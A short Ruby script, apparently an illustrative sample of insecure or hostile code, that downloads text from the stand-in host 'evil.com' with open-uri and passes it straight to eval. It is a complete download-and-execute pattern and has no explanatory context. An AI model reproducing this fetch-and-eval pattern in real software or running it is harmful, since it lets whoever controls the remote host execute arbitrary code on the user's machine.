require 'open-uri'

def fetch_data(url)
  open(url).read
end

def process_data(data)
  eval(data)
end

url = "http://evil.com/malicious_code.txt"
data = fetch_data(url)
process_data(data)